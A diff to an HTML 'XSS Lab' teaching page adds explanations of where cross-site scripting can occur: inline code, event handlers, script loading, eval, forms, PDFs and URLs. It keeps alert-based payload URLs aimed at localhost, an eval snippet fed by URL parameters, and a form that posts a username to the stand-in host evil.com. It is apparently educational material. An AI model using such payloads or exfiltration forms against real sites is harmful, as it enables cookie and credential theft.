@@ -5,6 +5,7 @@
       span:before {
           content: '\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0';
           text-decoration: line-through;
+          font-size: 24
       }
       * {
           box-sizing: border-box;
@@ -21,21 +22,34 @@
     <h1>XSS Lab </h1>
     <p>This page shows different forms of XSS to steal cookies</p>
     <br /><br />
-    Paste this into your browser's address bar to execute the XSS attack:
-    <br /><br />
-    <br><br><textarea rows="25%" cols="100%">
+    <h2>Where XSS can occur</h2>
 
-      <hr>
-XSS attack 1: 
+Basically, wherever Javascript can exist, XSS may occur. In the exercise below, we will demonstrate how to execute XSS attacks in different contexts.
+
+    <h3> Script or Text?</h3>
+
+Let's take a look at how Javascript is embedded into the DOM as either executable code or as text.
+    <textarea rows="25%" cols="100%">
+
+
+Javascript as Executable Code: 
 ---------------------
+Paste this into your browser's address bar:
 http://localhost:9081/xss-attack?xssvalue=<script>alert("XSS attack 1")</script>
+
+In the console, see how the code above is stored as executable code in the DOM:
 document.getElementsByTagName('*')
 document.getElementsByTagName("*")[2].innerHTML
 document.getElementsByTagName("*")[2].outerHTML
-<hr>
-non-XSS attack 2: String vs Script
+
+
+
+Javascript as Text
 -----------------------------------
+Paste this into your browser's address bar:
 http://localhost:9081/xss-attack?xssvalue=' <script>  alert('XSS attack 2') </script>'
+
+In the console, see how the code above is stored as text in the DOM:
 document.getElementsByTagName('*')
 document.getElementsByTagName("*")[4].innerHTML
 document.getElementsByTagName("*")[4].outerHTML
@@ -51,9 +65,13 @@ document.getElementsByTagName("*")[2].outerHTML
     >
     <hr />
     <br /><br />
-
     <hr />
-    <span> inline </span>
+    <h2>Where Javascript can Occur</h2>
+    <hr />
+    <span> XSS inline </span>
+<br /><br />
+    Javascript in its simplest form can exist as inline code. 
+    If an attacker manages to inject Javascript into a page, they can execute any code they want. This is the most common form of XSS attack.
     <br /><br />
     <a href="/xss/xss-inline.html" target=”_blank”>XSS inline</a>
     <br /><br />
@@ -66,7 +84,15 @@ document.getElementsByTagName("*")[2].outerHTML
 
 
     <hr />
-    <span> inline event handler</span>
+    <span> Inline event handler</span>
+    <br /><br />
+    Javascript execution can occur as an event handler. An event such as pushing a button will
+    cause some function to be executed. 
+    If an attacker manages to inject this or corrupt a function, 
+    they can execute any code they want. This is the most common form of XSS attack.
+ 
+
+
     <br /><br />
     <a href="/xss/xss-event-handler.html" target=”_blank”>Inline event handler</a>
 
@@ -80,8 +106,14 @@ document.getElementsByTagName("*")[2].outerHTML
     
 
     <hr />
-    <span> internal script loading</span>
-    <br />
+    <span> Internal script loading</span>
+    <br /><br />
+
+    Javascript execution can occur by loading JS code from an known internal "good" source 
+    that is allowed to execute. But if that "good" source is corrupted or injected, 
+    then the attacker can execute any code they want.
+    <br /><br />
+
     <a href="/xss/xss-internal-load.html" target=”_blank”>Internal script load</a>
 
 
@@ -92,8 +124,12 @@ document.getElementsByTagName("*")[2].outerHTML
 
 
   <hr />
-  <span> remote script loading</span>
-  <br />
+  <span> Remote script loading</span>
+  <br /><br />
+  Javascript execution can occur by loading JS code from an unknown/known external "grey" source 
+  that is allowed to execute. But if that "grey" source is corrupted or injected, 
+  then the attacker can execute any code they want.
+  <br /><br />
   <a href="/xss/xss-remote-foreign-load.html" target=”_blank”>Remote Script Load</a>
 
     <br><br><textarea rows="3" cols="100">
@@ -104,11 +140,14 @@ document.getElementsByTagName("*")[2].outerHTML
 
 
     <hr />
-    <span> text to script with eval</span>
-    <br />
+    <span> Text to script with eval</span>
+    <br /><br />
+    Javascript execution can occur by turning text into script with an eval statement.
+    If that text contains JS then the attacker can execute any code they want.
+    <br /><br />
     <a href="/xss/xss-eval-load.html" target=”_blank”>Script with Eval</a>
     <br><br><textarea rows="10" cols="100">
-    getUrlParameter("op1"); 
+    var op1 = getUrlParameter("op1"); 
     var op2 = getUrlParameter("op2"); 
     var sum =
     eval(`${op1} + ${op2}`); 
@@ -122,8 +161,20 @@ document.getElementsByTagName("*")[2].outerHTML
 
     <br /><br />
     <hr />
-    <span> xss in forms </span><br />
+    <span> XSS in forms </span><br />
+
+    <br /><br />
+    Javascript execution almost anywhere where users can input data. The classic
+    example is in forms. If an attacker manages to inject Javascript into a form, they can execute any code they want.
+    One of the most common types is called reflexive XSS. reflexive XSS is when the attacker injects Javascript into a 
+    search form and the response executes that JS code in the browser. The second type is stored XSS. 
+    Stored XSS is when the attacker injects JS into a form and the server stores that JS code in the database. 
+    When the server sends that JS code back to the browser, the browser executes that JS code.
+
+    <br /><br />
+
     <a href="https://localhost:9381/xss/xss-form.html" target=”_blank”>Script with Forms</a>
+    <br /><br />
     <form method="POST" action="https://evil.com/collect">
       <label>Username</label>
       <input
@@ -142,12 +193,18 @@ document.getElementsByTagName("*")[2].outerHTML
       <br /><br />
       <hr />
       <span> java in pdf </span><br />
+
+      <br /><br />
+      PDFs contain Javascript. If an attacker manages to inject Javascript into a PDF, 
+      they can execute any code they want.
+  
+      <br /><br />
       <a href="https://localhost:9381/xss/xss-pdf.html" target=”_blank”> Script in PDF</a>
 
       <br><br><textarea rows="10" cols="100">
       <object
         type="application/pdf"
-        data="/media/examples/In-CC0.pdf"
+        data="/media/examples/Evil.pdf"
         width="250"
         height="200"
       ></object>
@@ -157,7 +214,9 @@ document.getElementsByTagName("*")[2].outerHTML
       <br /><br />
       <hr />
       <span> Java in URL </span><br />
-
+      <br /><br />
+      Javascript execution can occur in the URL. If an attacker manages to inject Javascript into the URL, they can execute any code they want.
+            <br /><br />
       <a href="https://localhost:9381/xss/xss-urljavascript.html" target=”_blank”> Script in URL</a>
       <br /><br />
       <br><br><textarea rows="10" cols="60">
